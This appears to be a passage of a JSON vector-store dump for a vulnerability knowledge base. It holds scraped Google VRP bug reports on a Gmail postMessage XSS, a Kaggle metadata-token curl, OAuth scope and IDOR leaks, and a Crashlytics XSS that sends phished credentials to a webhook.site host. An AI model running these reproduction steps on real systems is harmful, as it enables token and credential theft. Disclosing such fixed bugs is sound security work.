"class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "But, a GCR bucket is still also a Cloud Storage bucket, so I'd rather expect a container process which tries to access a GCR bucket, no matter if that's via Cloud Storage or GCR API, to be limited by the Cloud Storage OAuth scope set on a GKE node. Am I missing something?\r\n---------------------------------------------------------------------- /CASE DESCRIPTION ----------------------------------------------------------------------\r\nThe way to achieve this is:\r\n---------------------------------------------------------------------- REPRODUCTION STEPS ----------------------------------------------------------------------\r\n1 - Create GKE cluster\r\ngcloud container clusters create testcluster-scoped --zone europe-west2-c --scopes=gke-default\r\nWhere the scopes are set to the same as the customer tags. The cluster uses the default service account for Compute, which by default has Editor role.\r\n2 - Create test GCR repository. For example:\r\neu.gcr.io/<project-name>/<repo-name>\r\nBindings should be like this:\r\n{ \r\n\"bindings\": [ \r\n{ \r\n\"members\": [ \r\n\"projectEditor:ideas-justme\", \r\n\"projectOwner:ideas-justme\" \r\n], \r\n\"role\": \"roles/storage.legacyBucketOwner\" \r\n}, \r\n{ \r\n\"members\": [ \r\n\"projectViewer:ideas-justme\" \r\n], \r\n\"role\": \"roles/storage.legacyBucketReader\" \r\n} \r\n], \r\n\"etag\": \"CAE=\" \r\n}\r\n3 - Open node(COS) with SSH and use /usr/bin/toolbox to run:\r\ngcloud container images delete --quiet --force-delete-tags eu.gcr.io/ideas-justme/simple-nginx-test\r\nOutput should be like:\r\n[...]\r\nDeleted [eu.gcr.io/ideas-justme/simple-nginx-test:latest]. \r\nDeleted [eu.gcr.io/ideas-justme/simple-nginx-test@sha256:76e80f9fef1b09988c1482178c34acafce9f7fe73d5ba097a6fc75ef9b990be5]. \r\n[...]\r\nExtra: This also can be done directly from an Ubuntu-based cluster (without using /usr/bin/toolbox)\r\n---------------------------------------------------------------------- /REPRODUCTION STEPS ----------------------------------------------------------------------\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3304, "end_char_idx": 5271, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7bdbf99f-5253-4c29-a20e-1bce6afc1b58": {"__data__": {"id_": "7bdbf99f-5253-4c29-a20e-1bce6afc1b58", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_111570.txt", "file_name": "20250408_175731_111570.txt", "file_type": "text/plain", "file_size": 1796, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cd9ff649-ec18-4ac9-9da4-274624c4b102", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_111570.txt", "file_name": "20250408_175731_111570.txt", "file_type": "text/plain", "file_size": 1796, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "b57cfae5575c219c143f4b2c50379ef1ff041d9a8af2e1733ed9a24a4e0555d9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://www.google.com/cloudprint\r\nReported by:\r\nJinseo Kim\r\nGoogle VRP\r\ntriaged\r\n05:38 | May 2, 2019\r\naccepted\r\n06:31 | May 4, 2019\r\nfixed\r\n10:40 | Sep 19, 2020\r\nreward decided\r\n$3,133.70\r\nSummary:\r\nhttps://www.googleapis.com/auth/cloudprint\r\nscope may read unfinished document\r\nSteps to reproduce:\r\nObtain OAuth token with\r\nhttps://www.googleapis.com/auth/cloudprint\r\nscope - You can do it easier with OAuth 2.0 Playground\r\nPrint any document to offline printer - Now Pending job was created.\r\ncurl \"https://www.google.com/cloudprint/jobs\" -H \"X-CloudPrint-Proxy: ASDF\" -H \"Authorization: OAuth <OBTAINED_OAUTH_TOKEN>\"\r\nto get fileUrl of above job.\r\ncurl \"<FILE_URL>\" -H \"X-CloudPrint-Proxy: ASDF\" -H \"Authorization: OAuth <OBTAINED_OAUTH_TOKEN>\"\r\nto get document file.\r\nBrowser/OS: Any\r\nAttack scenario:\r\nhttps://www.googleapis.com/auth/cloudprint\r\nscope is explained on OAuth page as this:\r\nManage your printers\r\n- View and manage your printers in Google CloudPrint\r\n- Print documents on your CloudPrint printers\r\nI showed that the token which includes above scope may read pending document, and it's not included in this explaining. Also, in my opinion, this is wrong Authorization; Maybe user thinks this permission can't read printing content, and I believe it's Google's intent.\r\nLet's assume attacker provides 'Daily Newspaper Printing Service', and it requires Google's OAuth token with CloudPrint scope. An user will understand its requiring; it's really needed for the service. But, attacker can read unfinished document with this vuln. Because every document starts with unfinished, attacker can read about every document that is printed with the user's Google CloudPrint Service.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1780, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "1d0a4247-f580-43da-b9cf-48fb969df598": {"__data__": {"id_": "1d0a4247-f580-43da-b9cf-48fb969df598", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_142983.txt", "file_name": "20250408_175731_142983.txt", "file_type": "text/plain", "file_size": 891, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "08c308e0-65ba-4778-8805-e21ca60057f2", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_142983.txt", "file_name": "20250408_175731_142983.txt", "file_type": "text/plain", "file_size": 891, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "1ae4db96510dd9d96645186ef90789f133ed04873791330bf6241ed27ed1a671", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in Kaggle Kernel\r\nReported by:\r\nJinseo Kim\r\nGoogle VRP\r\naccepted\r\n22:37 | Dec 10, 2018\r\nfixed\r\n04:49 | Feb 15, 2019\r\nreward decided\r\n$3,133.70\r\nSummary: Access Google Cloud Metadata on Kaggle Kernel\r\nSteps to reproduce:\r\nCreate a kernel on Kaggle.\r\nOn the right side, you can turn on Internet. Turn on it.\r\nCopy & Paste below code, and execute it.\r\n%%bash -e\r\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token\r\nAttack scenario:\r\nAny user in Kaggle can view the metadata of Google Cloud services. This can cause serious problems with Kaggle's services, including confidential information such as access token.\r\nAcquisition info:\r\nIt was March 2017.\r\nhttps://www.crunchbase.com/acquisition/google-acquires-kaggle--e769329b\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 875, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e05557b6-9643-43a0-bfd9-7ad2d423e3fe": {"__data__": {"id_": "e05557b6-9643-43a0-bfd9-7ad2d423e3fe", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_191146.txt", "file_name": "20250408_175731_191146.txt", "file_type": "text/plain", "file_size": 1222, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8b738493-b7b0-4073-8783-2c1ab2689ce9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_191146.txt", "file_name": "20250408_175731_191146.txt", "file_type": "text/plain", "file_size": 1222, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d6512f0ae5e50650ed788cc1f6f2ae77e54508f933a827c5103efd3ee3d450dd", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in Waze/PartnerDash\r\nReported by:\r\nAnze Jensterle\r\nGoogle VRP\r\naccepted\r\n01:34 | Nov 21, 2018\r\nfixed\r\n04:45 | Dec 5, 2018\r\nreward decided\r\n$500\r\nSummary: Waze Partner Data Leak\r\nSteps to reproduce:\r\nLogin to\r\nhttps://partnerdash.google.com/waze\r\nSave session data\r\nRequest\r\nhttps://partnerdash.google.com/waze/u/0/_json/_rpc/partnersvc/getPartnerList\r\nto get partner IDs\r\nUse partner ID in request to\r\nhttps://partnerdash.google.com/waze/u/0/_json/_rpc/partnersvc/getPartner\r\n(body {\"name\":\"wazepartners/VICTIMID\"})\r\nAttack scenario:\r\nA Google user can sign up for any of the Waze partner programs and even after rejection access the PartnerDash. This then allows them to use the RPC methods that are used by the web app. A user could retrieve a partner profile for a known partner and gain private data such as the partner's private contact info, address, private URLs and even Google employee emails since there are fields such as approverEmail that show the Google employee email. All of the gathered data can then be used in a spear phishing attack on the waze partner.\r\nAcquisition info:\r\nGoogle acquired waze in 2013\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1206, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "52036974-cad1-4c16-a9e3-b942122b4bf6": {"__data__": {"id_": "52036974-cad1-4c16-a9e3-b942122b4bf6", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_300028.txt", "file_name": "20250408_175733_300028.txt", "file_type": "text/plain", "file_size": 6036, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "14202eba-f4bb-434a-886d-25619c626e97", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_300028.txt", "file_name": "20250408_175733_300028.txt", "file_type": "text/plain", "file_size": 6036, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "10548159f2979cf2d7fe6fc1f364dfa9c16537a46aea6d60148f412312e4dffa", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "8864d579-699a-43e1-9153-d4c86a9208c5", "node_type": "1", "metadata": {}, "hash": "0c4a823768f13ad6d79b1b5ddb584772e32a06dae1aed9485ee27cf522b1b810", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https://mail.google.com/mail/u/0/#inbox\r\nReported by:\r\nEngue Gillier\r\nGoogle VRP\r\naccepted\r\n02:11 | Nov 2, 2018\r\nfixed\r\n04:11 | Dec 13, 2018\r\nreward decided\r\n$5,000\r\nHello Google VRP, Thanks for BugSWAT/hofplz! :)\r\nI just got back home and I have an XSS on Gmail to report!\r\nThe XSS has some limitations: it is blocked by CSP on Chrome/Firefox (but not Edge/IE11) and it requires to predict or access a window.random() value.\r\nPOC link:\r\nhttps://opnsec.com/google/gmail.html\r\nSteps to reproduce:\r\nOpen the POC link in Edge/IE11 (or Chrome/Firefox, the CSP logs will show the blocked XSS) and follow the instructions:\r\nClick to Open Gmail in new window\r\nOpen the dev console (F12) in the Gmail window and enter:\r\naddEventListener(\"message\",function(e){console.log(e.data)})\r\nIn the console logs, you will see many messages similar to this:\r\n[CHANNEL_NAME]|c:[[[\"h_h\",true,null,true,true]],null]\r\nor\r\n[CHANNEL_NAME]|cp:[[[\"h_chm\",\"preld\",\"https://hangouts.google.com/webchat/u/0/frame...#epreld\"]],null]\r\nwhere\r\n[CHANNEL_NAME]\r\nis a 6 (or 5) alphanumeric random value. (You will also see similar message with a longer [CHANNEL_NAME] but use only the 6 or 5 chars [CHANNEL_NAME])\r\nCopy the [CHANNEL_NAME] value\r\nPaste the channel value in the POC page\r\nClick to send a postMessage to the Gmail window\r\nThe XSS executes on\r\nhttps://mail.google.com/\r\n(If not, check the console log where you should see that CSP prevented an iframe to load with a \"javascript:\" src.)\r\nBrowser/OS: \r\nTested on Edge/IE11 on Windows 10 (and on Chrome/Firefox but blocked by CSP)\r\nTechnical details:\r\nThe basis of this vulnerability is that\r\nhttps://mail.google.com/mail/u/0/#inbox\r\nloads an iframe at\r\nhttps://hangouts.google.com/webchat/u/0/load\r\nnamed \"gtn-roster-iframe-id\". The Hangouts iframe then sends a postMessage to the main window mail.google.com with a URL, and mail.google.com loads that URL in another iframe. mail.google.com doesn't check if the URL contains a javascript handler. In addition, mail.google.com doesn't check the message origin or source.\r\nThat means that any window/iframe can send arbitrary javascript/data handlers URL by postMessage to the mail.google.com page to execute XSS.\r\nThis is blocked by CSP rules \"script-src nonce\" and \"frame-src\". However, this is not blocked by Edge/IE11 and, anyway, who would want to rely on CSP for the security of its website! ;-)\r\nThere is another problem: when mail.google.com loads the \"gtn-roster-iframe\", mail.google.com generates a random Channel name of 6 or 5 chars and shares it with \"gtn-roster-iframe\" by postMessage to distinguish messages of this channel from other postMessages with other iframes.\r\nBrute-forcing the 6/5 chars value seems not realistic because the postMessage api seems not fast enough (around 1ms from what I read).\r\nThis random number is generated using Math.random(), which is not a crypto secure random generator, is not protected against crypto attacks and should not be used for security. This means that an attacker could potentially predict the value of Math.random() and then use it for the XSS injection (for example:\r\nhttp://ifsec.blogspot.com/2012/09/of-html5-security-cross-domain.html\r\n). My understanding is that to do this, an attacker should 1. test Math.random() on its domain to learn the state of the seed, 2. predict the next state of the seed, 3. open the mail.google.com window and predict the value of Math.random().\r\nThere is another way to get the random value. The mail.google.com regularly sends the random value to the \"gtn-roster-iframe\" by postMessage using \"*\" as target. This means that if an attacker can redirect the \"gtn-roster-iframe\" to his own domain, he will have access to the random value with the postMessages sent by mail.google.com, without cracking the Math.random() function.\r\nTo redirect the \"gtn-roster-iframe\", the attacker needs to have an iframe in the parent hierarchy of the \"gtn-roster-iframe\".", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3982, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8864d579-699a-43e1-9153-d4c86a9208c5": {"__data__": {"id_": "8864d579-699a-43e1-9153-d4c86a9208c5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_300028.txt", "file_name": "20250408_175733_300028.txt", "file_type": "text/plain", "file_size": 6036, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "14202eba-f4bb-434a-886d-25619c626e97", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_300028.txt", "file_name": "20250408_175733_300028.txt", "file_type": "text/plain", "file_size": 6036, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "10548159f2979cf2d7fe6fc1f364dfa9c16537a46aea6d60148f412312e4dffa", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "52036974-cad1-4c16-a9e3-b942122b4bf6", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_300028.txt", "file_name": "20250408_175733_300028.txt", "file_type": "text/plain", "file_size": 6036, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d19b03650033ba1990493ee58aa53b5c5bb046c5c19995d527b2483cb37b66f2", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "My understanding is that to do this, an attacker should 1. test Math.random() on its domain to learn the state of the seed, 2. predict the next state of the seed, 3. open the mail.google.com window and predict the value of Math.random().\r\nThere is another way to get the random value. The mail.google.com regularly sends the random value to the \"gtn-roster-iframe\" by postMessage using \"*\" as target. This means that if an attacker can redirect the \"gtn-roster-iframe\" to his own domain, he will have access to the random value with the postMessages sent by mail.google.com, without cracking the Math.random() function.\r\nTo redirect the \"gtn-roster-iframe\", the attacker needs to have an iframe in the parent hierarchy of the \"gtn-roster-iframe\". The mail.google.com window has \"x-frame-options: SAMEORIGIN\". \r\nThis means that if we can control any iframe embed in mail.google.com, we could embed the gmail inbox page in our iframe, then redirect the \"gtn-roster-iframe\" to our domain, access the channel random value and send the postMessage with XSS payload. I didn't find a way to control an iframe in mail.google.com. However, the beta \"AMP4email\" features might be interesting, potentially allowing this XSS to be sent by email, and I would love to test this feature in advance!\r\nSome Source code snippets:\r\ngenerates the random channel name:\r\nd.cn = Math.floor(2147483648 * Math.random()).toString(36);\r\nhttps://hangouts.google.com/_/scs/chat-static/_/js/k=chat.smh.en_US.0f_8uxbjzhI.O/am=DA/rt=j/d=0/rs=AGNGyv2x37Hc72SqLZJ2az5GSiqA9HacTA/m=b\r\nloads the iframe URL sent by postMessage\r\nthis.Ea(\"mc\").appendChild(this.Ca.Ea());\r\nhttps://mail.google.com/_/scs/mail-static/_/js/k=gmail.main.en.iWSjMX4rTqI.O/am=_p8Qw3hA_r7P8TGctzECHA6GojAA7P-PII_Kvu1vTAhAlCVw5A-P_5vxBfj_R7oZAAAAAAAAAAAAAAAAAAAAXIEmWg/rt=j/d=1/exm=Av2a7c,CTcde,EVZC0d,Gz34U,IiBrJf,J03Die,Kgu6Te,M25vPb,MHpzHf,MMhUM,MigGy,N35dyc,NVcOs,OIxRw,PZhDZb,PaBahd,Ps3HAc,RI4GO,Sz7W7c,Trl7bc,UZdBGe,Uq2DTd,VOAugd,WI7wt,YesRdb,aEgFwf,coi,cs,dFpypf,f,hif4bd,igbF5,jGPO6,kDVnwb,kL0rjf,lUPpNd,lhJ7R,mE4mJ,m_i,ml,o2ajQe,pA5mjb,pauPV,puPi7e,rMQdJc,spc,spit,spl,sps,spt,t,u7EXMd,uuoH9c,vXhLBe,w0FYpd,wvjFZd,yWJZbc/ed=1/im=1/rs=AHGWq9BLc708OM8Pyk5N0Y9_IbyrtxwSAw/m=sm\r\nTo fix the issue, mail.google.com should check the origin and the source of the postMessage before loading the iframe. In addition, it should validates the URL to only accept URL starting with https://\r\nAttack scenario:\r\nLet me know if you know how to perform the cross domain Math.random() prediction attack on a modern browser, I would be very interested about it!\r\nAlso, you mentionned during BugSWAT that you were considering opening the AMP4email Gmail features to bug hunters, I would also be very interested to test it.\r\nBest,\r\nEnguerran\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3236, "end_char_idx": 6020, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "98b65ce1-d404-4410-b60d-f9700f85ac51": {"__data__": {"id_": "98b65ce1-d404-4410-b60d-f9700f85ac51", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_327774.txt", "file_name": "20250408_175733_327774.txt", "file_type": "text/plain", "file_size": 1471, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f14c65c4-f4e2-4744-a7a8-99617dca79c8", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_327774.txt", "file_name": "20250408_175733_327774.txt", "file_type": "text/plain", "file_size": 1471, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "78bacaeea8a737820fa25933ce2645817674ea0afd3e8505dd67f4800e490989", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://myactivity.google.com/history/audio/play/<NUMBER>?authuser=<USER NUMBER. GENERALLY 0>\r\nReported by:\r\nJinseo Kim\r\nGoogle VRP\r\naccepted\r\n20:14 | Sep 18, 2018\r\nfixed\r\n10:46 | Oct 26, 2018\r\nreward decided\r\n$500\r\nSummary: Brute-Force is available for getting Google Voice Activity\r\nSteps to reproduce:\r\nEnter\r\nhttps://history.google.com/history/audio?utm_source%3Dhelp\r\nGet any Audio URL (It made with Google Assistant or Home. In my case:\r\nhttps://myactivity.google.com/history/audio/play/1537073323337432?authuser=1\r\n)\r\nUse <audio> tag in somewhere and Notify that you can listen. (In my case:\r\nhttp://jsfiddle.net/L7jyx5qr/1/\r\nand sorry for autoplay)\r\nBrowser/OS: I believe that it works everywhere. But it's my environment:\r\nMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36\r\nUbuntu 18.04\r\nAttack scenario:\r\nAny site can get Voice Activity with\r\nhttps://myactivity.google.com/history/audio/play/<NUMBER>?authuser=<USER NUMBER. GENERALLY 0>\r\n(well, it needs brute-force or social engineering(get copy of site)) as <audio> tag (on that user's browser).\r\nIf found voice link(Etc: robots.txt allows\r\n/\r\n, but I didn't test about it), it can be exported:\r\nhttps://github.com/mattdiamond/Recorderjs\r\nSite's owner(yes, he's attacker) can get the voice data.\r\nThis vuln can leak users' voice data; personal information.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1455, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "155b9b18-88ea-4400-ae90-d380e037eda2": {"__data__": {"id_": "155b9b18-88ea-4400-ae90-d380e037eda2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_359392.txt", "file_name": "20250408_175733_359392.txt", "file_type": "text/plain", "file_size": 2224, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c1dc16ca-dd74-462c-9b49-f30857a804fa", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_359392.txt", "file_name": "20250408_175733_359392.txt", "file_type": "text/plain", "file_size": 2224, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "3721cb3daf18da9316521b25de11e7c9662bc414802e6a68392ec7b37477e2ea", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://developers.google.com/nearby/connections/overview\r\nReported by:\r\nDaniele\r\nGoogle VRP\r\ntriaged\r\n23:00 | Sep 12, 2018\r\naccepted\r\n22:15 | Sep 24, 2018\r\nfixed\r\n04:13 | Nov 9, 2018\r\nGoogle comment\r\nThis issue ended up being addressed by a change to the\r\ndocumentation\r\nto reflect the functionality correctly.\r\nSummary: The library allows an advertiser to ask discoverers to associate with an arbitray access point and overwrite default routes, capturing all traffic from the discoverer\r\nSteps to reproduce:\r\nThe strategy is P2P_STAR\r\nAttacker controls a malicious advertiser and an (Internet connected) access point\r\nThe victim discoverer connects to the advertiser over Bluetooth\r\nThe advertiser asks the discoverer to switch to WiFi, providing essid and password to own access point.\r\nThe discoverer associates to AP, gets default route via DCHP pointing to attacker system\r\nAll Internet bound traffic from discoverer (not only nearby related) is now sent to attacker without user noticing\r\nBrowser/OS: Android and Android Things versions supporting the Nearby\r\nConnections API. In the future potentially also iOS\r\nAttack scenario:\r\nSetup: victim discoverer looks for an advertiser (using the P2P_STAR strategy). An attacker in proximity responds, impersonating the wanted advertiser. Victim discoverer accepts/establishes connection, believing this to be the wanted advertiser. Attacker then initiates switch to WiFi link, victim automatically (without user interaction) associates to the attacker AP, using default route from attacker's DHCP response. All victim IPv4 traffic now is routed by its OS via the access point of the attacker.\r\nAs a result, the attacker is now able to monitor and tamper with all traffic coming from the victim. The traffic includes the packets generated by other applications that are not using the library, yet they require Internet access such as email clients, web browsers, cloud services. We understand that most of such traffic is are secured with TLS, but we believe that this attack is\r\nstill serious, e.g., the attacker can learn information about the victim from encrypted traffic.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2208, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "387d58a6-802f-42c3-8d0a-1678242c8b8b": {"__data__": {"id_": "387d58a6-802f-42c3-8d0a-1678242c8b8b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_390728.txt", "file_name": "20250408_175733_390728.txt", "file_type": "text/plain", "file_size": 2966, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "072ecfae-aeb3-4841-b622-c8c6b0bcbfc7", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_390728.txt", "file_name": "20250408_175733_390728.txt", "file_type": "text/plain", "file_size": 2966, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fddee8f1264ac6d289b9fa36edd7adbe3a000d199e7f3dd0b7c1963133532de4", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in Fabric - Crashlytics\r\nReported by:\r\nValentin Slawicek\r\nGoogle VRP\r\ntriaged\r\n03:01 | Aug 14, 2018\r\naccepted\r\n06:49 | Aug 14, 2018\r\nfixed\r\n22:59 | Aug 22, 2018\r\nreward decided\r\n$100\r\nSummary: XSS in android/ios stacktrace can \"force\" user to re-login. Login-credentials are sent to the attacker. Credentials for another Fabric account can be easily extracted. The attacker gains access to all sensitive information in Fabric.\r\nSteps to reproduce:\r\nDownload and unzip the\r\ncomplete\r\nPOC Android application from\r\nhttps://drive.google.com/file/d/1MClpBVOK6JqxPbx2kldCsrfEgY4hgjsU/view?usp=sharing\r\n(The malicious payload is in Activity.kt)\r\nSet package and io.fabric.ApiKey in AndroidManifest.xml (extracted from target apk)\r\nSet applicationId, versionCode and versionName in app/build.gradle (extracted from target apk)\r\nCompile and start the app several times (it crashes 1 second after the start, thats intended)\r\nWait several hours. By starting the app multiple times the developers of the targeted App that uses Crashlytics will even get a mail if enabled (velocity alert).\r\n(Current values of package, io.fabric.ApiKey and applicationId are the ones from my own app)\r\nBrowser/OS: Current Chrome Version 68\r\nAttack scenario:\r\nEveryone can exploit the vulnerability. Only some public information about the target Android-application is needed, which can be extracted from the apk-file of the target App by unzipping it and copying the values. The attacker gains full control of the target Fabric account, sees all sensitive information about the App (Crashlytics, Answers and all other services that are linked with the Fabric account). The attacker may even find sensitive user-information that is stored in other crashlogs.\r\nThe attacked developer checks Crashlytics (either by clicking the velocity alert mail or by investigating the now probably most occurred crash) since the attacker sent several crash reports to Crashlytics.\r\nThe attacked developer sees a Stacktrace that leads to no clue except the error message \"See log for more information.\" He of course clicks at the green button \"View all Sessions\" to see the logs.\r\nThe attacked developer gets prompted once to re-authenticate due to (false) session timeout. The domain is \"\r\nhttps://fabric.io/login\"\r\n, so he will trust the site. (In fact Google Chrome will even prefill the credentials (if enabled) since it detects that it is on the correct site.)\r\nThe credentials are sent to a attackers site, in the example \"\r\nhttps://webhook.site/148d5a3a-72a7-49dd-85d8-31f15887096f\"\r\nAll traces from the attack are removed from the DOM, and a value is stored to LocalStorage so the 